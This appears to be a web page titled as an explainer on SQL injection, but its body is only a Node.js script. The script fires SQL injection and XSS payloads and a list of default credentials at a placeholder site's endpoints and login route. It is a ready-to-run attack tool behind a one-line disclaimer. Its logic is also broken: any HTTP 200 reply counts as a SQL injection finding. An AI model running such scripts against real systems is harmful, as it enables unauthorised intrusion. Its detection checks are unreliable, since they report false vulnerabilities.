What is SQL Injection (SQLi) Vulnerability?

// Penetration Testing Script for Web Applications
// IMPORTANT: This script is for educational purposes only. Unauthorized testing is illegal.

const axios = require('axios');

// Configurations
const targetURL = 'https://example.com'; // Target URL

// Function to test for SQL Injection
async function testSQLInjection() {
  const payloads = ["' OR 1=1--", "' OR 'a'='a", "' OR 'a'='a'--"];
  for (let payload of payloads) {
    try {
      const response = await axios.get(`${targetURL}/vulnerableEndpoint?param=${payload}`);
      if (response.data.includes('SQL error') || response.status === 200) {
        console.log(`Potential SQL Injection vulnerability detected with payload: ${payload}`);
      } else {
        console.log(`Payload: ${payload} did not trigger SQL injection.`);
      }
    } catch (error) {
      console.error(`Error testing SQL Injection with payload: ${payload}`, error);
    }
  }
}

// Function to test for XSS
async function testXSS() {
  const payloads = ["<script>alert('XSS')</script>", "'><script>alert('XSS')</script>"];
  for (let payload of payloads) {
    try {
      const response = await axios.get(`${targetURL}/vulnerableEndpoint?param=${encodeURIComponent(payload)}`);
      if (response.data.includes(payload)) {
        console.log(`Potential XSS vulnerability detected with payload: ${payload}`);
      } else {
        console.log(`Payload: ${payload} did not trigger XSS.`);
      }
    } catch (error) {
      console.error(`Error testing XSS with payload: ${payload}`, error);
    }
  }
}

// Function to test insecure authentication mechanisms
async function testInsecureAuthentication() {
  const weakCredentials = [
    { username: 'admin', password: 'admin' },
    { username: 'admin', password: 'password' },
    { username: 'user', password: 'user' }
  ];
  for (let creds of weakCredentials) {
    try {
      const response = await axios.post(`${targetURL}/login`, creds);
      if (response.status === 200 && response.data.includes('Welcome')) {
        console.log(`Insecure authentication detected with credentials: ${JSON.stringify(creds)}`);
      } else {
        console.log(`Credentials: ${JSON.stringify(creds)} did not log in successfully.`);
      }
    } catch (error) {
      console.error(`Error testing authentication with credentials: ${JSON.stringify(creds)}`, error);
    }
  }
}

// Main function to run all tests
async function runPenetrationTests() {
  console.log('Starting penetration tests...');
  await testSQLInjection();
  await testXSS();
  await testInsecureAuthentication();
  console.log('Penetration tests completed.');
}

// Run the tests
runPenetrationTests();














